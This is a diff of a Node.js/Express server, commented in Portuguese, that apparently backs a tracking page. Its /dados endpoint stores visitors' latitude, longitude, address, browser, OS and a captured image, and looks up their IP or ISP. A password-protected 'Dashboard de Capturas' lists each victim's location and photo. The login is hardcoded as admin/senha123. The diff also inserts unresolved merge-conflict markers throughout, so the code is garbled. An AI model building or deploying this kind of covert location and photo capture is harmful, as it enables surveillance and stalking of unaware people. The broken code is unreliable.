@@ -1,7 +1,16 @@
+<<<<<<< HEAD
 // ========== AUTENTICAÇÃO ==========
 const auth = require('basic-auth');
 function autenticar(req, res, next) {
   const usuario = auth(req);
+=======
+//codigo comeco autenticacao
+const auth = require('basic-auth');
+
+function autenticar(req, res, next) {
+  const usuario = auth(req);
+
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
   const usuarioValido = 'admin';
   const senhaValida = 'senha123';
 
@@ -13,8 +22,18 @@ function autenticar(req, res, next) {
   next();
 }
 
+<<<<<<< HEAD
 // ========== DEPENDÊNCIAS ==========
 const axios = require('axios');
+=======
+//com atenticacao codigo fim
+
+
+
+const axios = require('axios');
+
+
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -22,6 +41,7 @@ const https = require('https');
 
 const app = express();
 app.use(express.static(path.join(__dirname, 'public')));
+<<<<<<< HEAD
 app.use(express.static(__dirname));
 app.use(express.json({ limit: '10mb' }));
 
@@ -257,6 +277,26 @@ app.post('/dados', async (req, res) => {
 
   // Captura completa de IP público real
   const dadosIP = await obterIPPublicoReal(req);
+=======
+app.use(express.static(__dirname)); // Serve imagens salvas na raiz
+app.use(express.json({ limit: '10mb' }));
+
+let dadosRecebidos = [];
+app.post('/dados', async (req, res) => {
+  const { latitude, longitude, endereco, imagem, sistema, navegador } = req.body;
+
+  const fileName = `captura_${Date.now()}.png`;
+  const base64Data = imagem.replace(/^data:image\/png;base64,/, "");
+  fs.writeFileSync(path.join(__dirname, fileName), base64Data, 'base64');
+
+  let operadora = 'Desconhecida';
+  try {
+    const ipRes = await axios.get('http://ip-api.com/json');
+    operadora = ipRes.data.isp || operadora;
+  } catch (err) {
+    console.error('Erro ao buscar operadora:', err.message);
+  }
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
 
   const registro = {
     latitude,
@@ -266,6 +306,7 @@ app.post('/dados', async (req, res) => {
     navegador,
     imagem: fileName,
     horario: new Date().toLocaleString(),
+<<<<<<< HEAD
     
     // Dados de IP expandidos
     ipOriginal: dadosIP.ipOriginal,
@@ -351,6 +392,23 @@ app.get('/dados-json', autenticar, (req, res) => {
 
 // ========== DASHBOARD HTML DINÂMICO MELHORADO ==========
 app.get('/dashboard', autenticar, (req, res) => {
+=======
+    operadora
+  };
+
+  dadosRecebidos.push(registro);
+  console.log('📥 Novo registro recebido:', registro);
+
+  res.send('Dados recebidos com sucesso!');
+});
+
+
+
+app.get('/dashboard',autenticar, (req, res) => {//autenticação
+  const total = dadosRecebidos.length;
+  const ultimo = total > 0 ? dadosRecebidos[total - 1] : null;
+
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
   let html = `
     <!DOCTYPE html>
     <html lang="pt-BR">
@@ -371,7 +429,11 @@ app.get('/dashboard', autenticar, (req, res) => {
           margin-bottom: 10px;
         }
         .container {
+<<<<<<< HEAD
           max-width: 1200px;
+=======
+          max-width: 900px;
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
           margin: auto;
         }
         .stats {
@@ -380,6 +442,7 @@ app.get('/dashboard', autenticar, (req, res) => {
           border-radius: 10px;
           box-shadow: 0 2px 10px rgba(255,255,255,0.05);
           margin-bottom: 30px;
+<<<<<<< HEAD
           display: grid;
           grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
           gap: 20px;
@@ -394,6 +457,8 @@ app.get('/dashboard', autenticar, (req, res) => {
           font-size: 2em;
           font-weight: bold;
           color: #c0aaff;
+=======
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
         }
         .card {
           background: #1e1e1e;
@@ -405,6 +470,7 @@ app.get('/dashboard', autenticar, (req, res) => {
         .card h2 {
           color: #e0d4f7;
           margin-top: 0;
+<<<<<<< HEAD
           display: flex;
           align-items: center;
           gap: 10px;
@@ -414,11 +480,17 @@ app.get('/dashboard', autenticar, (req, res) => {
           padding: 5px;
           background: rgba(255,255,255,0.02);
           border-radius: 4px;
+=======
+        }
+        .info {
+          margin: 10px 0;
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
         }
         .label {
           font-weight: bold;
           color: #c0aaff;
         }
+<<<<<<< HEAD
         .value {
           color: #f0f0f0;
         }
@@ -454,12 +526,15 @@ app.get('/dashboard', autenticar, (req, res) => {
           background: linear-gradient(135deg, #2a2a2a, #2a3a4a);
           border-left: 4px solid #339af0;
         }
+=======
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
         img {
           max-width: 100%;
           border-radius: 8px;
           margin-top: 10px;
           box-shadow: 0 0 5px rgba(255,255,255,0.2);
         }
+<<<<<<< HEAD
         .export-btn {
           background: #6a4c93;
           color: white;
@@ -707,11 +782,48 @@ app.get('/', (req, res) => {
 });
 
 // ========== CONFIGURAÇÃO HTTPS ==========
+=======
+      </style>
+    </head>
+    <body>
+      <div class="container">
+        <h1>📊 Dashboard de Capturas</h1>
+        <div class="stats">
+          <p><span class="label">Total de acessos:</span> ${total}</p>
+          ${ultimo ? `<p><span class="label">Último acesso:</span> ${ultimo.horario}</p>` : ''}
+        </div>
+  `;
+
+  dadosRecebidos.slice().reverse().forEach((dado, index) => {
+    html += `
+      <div class="card">
+        <h2>📥 Acesso ${index + 1}</h2>
+        <div class="info"><span class="label">Horário:</span> ${dado.horario}</div>
+        <div class="info"><span class="label">Endereço:</span> ${dado.endereco}</div>
+        <div class="info"><span class="label">Latitude / Longitude:</span> ${dado.latitude}, ${dado.longitude}</div>
+        <div class="info"><span class="label">Sistema:</span> ${dado.sistema}</div>
+        <div class="info"><span class="label">Navegador:</span> ${dado.navegador}</div>
+        <div class="info"><span class="label">Operadora:</span> ${dado.operadora}</div>
+        <div class="info"><span class="label">Imagem capturada:</span><br><img src="/${dado.imagem}" alt="Captura"></div>
+      </div>
+    `;
+  });
+
+  html += `</div></body></html>`;
+  res.send(html);
+});
+
+
+
+
+
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
 const options = {
   key: fs.readFileSync('key.pem'),
   cert: fs.readFileSync('cert.pem')
 };
 
+<<<<<<< HEAD
 // ========== INICIALIZAÇÃO DO SERVIDOR ==========
 https.createServer(options, app).listen(3000, () => {
   console.log('🔒 Servidor HTTPS rodando na porta 3000');
@@ -720,3 +832,8 @@ https.createServer(options, app).listen(3000, () => {
   console.log('🔍 Teste de IP: https://localhost:3000/meu-ip');
   console.log('✅ Sistema de captura de IP público ativo!');
 });
+=======
+https.createServer(options, app).listen(3000, () => {
+  console.log('🔒 Servidor HTTPS rodando na porta 3000');
+});
+>>>>>>> 90cf3985b48f8e01857608783561ca4a4b2c8bc1
